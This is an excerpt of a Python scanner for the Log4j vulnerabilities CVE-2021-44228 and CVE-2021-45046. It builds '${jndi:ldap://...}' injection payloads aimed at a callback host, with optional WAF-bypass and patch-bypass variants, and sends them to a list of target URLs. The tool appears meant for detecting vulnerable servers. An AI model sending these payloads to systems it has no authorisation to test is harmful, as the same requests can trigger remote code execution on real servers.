...
cprint('[•] Scanner provided modify by luckyeast', "yellow")
...
parser.add_argument("--request-type",
                    dest="request_type",
                    help="Request Type: (get, post) - [Default: post].",
                    default="post",
                    action='store')
...
parser.add_argument("--test-CVE-2021-45046",
                    ...
                    action='store_true')
parser.add_argument("--local-ldap",
                    dest="local_ldap_service",
                    help="Local Ldap Service (Options: 1, 0) - [Default: 0].",
                    default="0",
                    action='store')
...
def loaclscan(url, callback_host):
    parsed_url = parse_url(url)
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
    http_parm = parsed_url["host"] + '_' + random_string
    payload = '${jndi:ldap://%s/%s}' % (callback_host, http_parm)
    payloads = [payload]
    if args.waf_bypass_payloads:
        payloads.extend(generate_waf_bypass_payloads(f'{callback_host}', http_parm))
    if args.cve_2021_45046:
        cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
        payloads = get_cve_2021_45046_payloads(f'{callback_host}', http_parm)
...
def main():
    ...
    dns_callback_host = ""
    if args.local_ldap_service == '1':
        local = input('[•] Plz input your local ldap address: ')
        cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
        for url in urls:
            cprint(f"[•] URL: {url}", "magenta")
            loaclscan(url, local)
        cprint("[•] Payloads sent to all URLs. Please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
        return
